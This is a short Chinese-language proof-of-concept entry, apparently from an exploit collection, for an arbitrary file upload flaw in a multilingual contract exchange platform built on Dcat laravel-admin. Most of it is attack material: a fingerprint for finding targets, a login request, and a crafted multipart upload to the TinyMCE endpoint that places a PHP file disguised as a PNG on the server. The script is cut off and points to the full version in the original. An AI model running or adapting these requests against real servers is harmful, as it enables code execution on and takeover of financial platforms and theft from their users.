# 10005-19国语言合约交易所系统upload_token文件上传漏洞

- **系统**：10005　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`icon_hash="-441541656"`
- **请求**：`POST /admin/auth/login HTTP/1.1`
- **关键头**：`Content-Length: 104`　`X-CSRF-TOKEN: O7VtLNisPQtu1CjviD0R3SPV4OeZQatFDOWbtmr3`　`X-Requested-With: XMLHttpRequest`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`

**请求体 / payload**
```
_token=O7VtLNisPQtu1CjviD0R3SPV4OeZQatFDOWbtmr3&username=&password=111111
位于 /vendor/dcat/laravel-admin/src/Controllers/TinymceController.php 控制器利⽤
DcatApi 的上传接⼝即可成功 Upload 任意⽂件
POST /admin/dcat-api/tinymce/upload?_token=AHeVBtO0SiRu8T1OymnB0FjzMLdPiueuSPhrb679&dir=/ HTTP/1.1
Content-Length: 198
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzAKBjt33dEezyqIc
------WebKitFormBoundaryzAKBjt33dEezyqIc
Content-Disposition: form-data; name="file"; filename="aaa.php"
Content-Type: image/png
<?php phpinfo();?>
------WebKitFormBoundaryzAKBjt33dEezyqIc…（脚本共 607 字，完整版见原文）
```
- **预期**：200　|　—